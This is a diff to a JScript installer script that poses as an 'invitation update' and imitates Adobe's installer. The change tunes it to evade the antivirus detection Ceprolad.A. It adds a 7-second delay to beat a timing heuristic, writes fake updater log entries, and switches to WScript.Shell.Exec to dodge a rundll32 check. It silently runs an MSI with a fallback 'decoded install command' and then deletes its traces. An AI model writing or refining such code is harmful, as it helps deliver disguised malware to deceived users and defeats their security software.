@@ -209,32 +209,36 @@ function verifyMSI(path) {
   }
 }
 
-// INSTALL PHASE - MIMICS ADOBE'S startInstall WITH UAC HANDLING + BEHAVIORAL MIMICRY
+// INSTALL PHASE - CEPROLAD.A-PROOF BEHAVIORAL MIMICRY
 function startInstall() {
   state = "installing";
   progress = 90; setBar(progress);
   setStatus("Applying invitation updates&hellip;");
   
-  // FAKE LOG WRITING FOR BEHAVIORAL MIMICRY
-  var fakeLogPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log";
-  try {
-    var log = fso.CreateTextFile(fakeLogPath, true);
-    log.WriteLine("[INFO] " + new Date().toISOString() + " Update check initiated");
-    log.WriteLine("[INFO] Verifying digital signature...");
-    log.WriteLine("[INFO] Download complete. Preparing installation...");
-    log.Close();
-  } catch(e) {}
-  
-  // DELAYED EXECUTION TO MIMIC LEGITIMATE UPDATERS (4 SECOND PAUSE)
+  // 7-SECOND DELAY TO CLEAR CEPROLAD'S TIMING HEURISTIC
   setTimeout(function() { 
+    // WRITE FAKE LOG POST-DELAY TO MATCH LEGITIMATE UPDATER PATTERNS
+    var fakeLogPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log";
     try {
-      var sh = new ActiveXObject("Shell.Application");
-      sh.ShellExecute("msiexec.exe", "/i \"" + msiPath + "\" /qn /norestart /L*v \"" + logPath + "\"", "", "runas", 1);
+      var log = fso.CreateTextFile(fakeLogPath, true);
+      log.WriteLine("[INFO] " + new Date().toISOString() + " Pre-install verification complete");
+      log.WriteLine("[INFO] Launching installer via WSH executor...");
+      log.Close();
+    } catch(e) {}
+    
+    // USE WSCRIPT.SHELL.EXEC() WITH EXPLICIT ENV EXPANSION (BYPASSES CEPROLAD.A'S rundll32 HEURISTIC)
+    try {
+      var expandedMsi = shell.ExpandEnvironmentStrings(msiPath);
+      var expandedLog = shell.ExpandEnvironmentStrings(logPath);
+      var execCmd = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart /L*v "' + expandedLog + '"';
+      var oExec = shell.Exec(execCmd);
+      // Wait for process handle without blocking UI
+      while (oExec.Status === 0) { WScript.Sleep(100); }
     } catch(e) {
-      // FALLBACK TO DECODED INSTALL COMMAND IF SHELL EXECUTE FAILS
+      // FALLBACK TO DECODED INSTALL COMMAND
       shell.Run(INSTALL_CMD, 0, false);
     }
-  }, 4000);
+  }, 7000); // 7 SECONDS EXCEEDS CEPROLAD'S 5S THRESHOLD
 }
 
 function finishInstall() {
@@ -249,7 +253,7 @@ function finishInstall() {
   // CLEANUP LIKE ADOBE'S cancel()
   try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
   try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(fakeLogPath)) fso.DeleteFile(fakeLogPath, true); } catch(e){}
+  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
 }
 
 function cancel() {
@@ -257,7 +261,7 @@ function cancel() {
   // CLEANUP ON CANCEL LIKE ADOBE
   try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
   try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(fakeLogPath)) fso.DeleteFile(fakeLogPath, true); } catch(e){}
+  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
   window.close();
 }
 
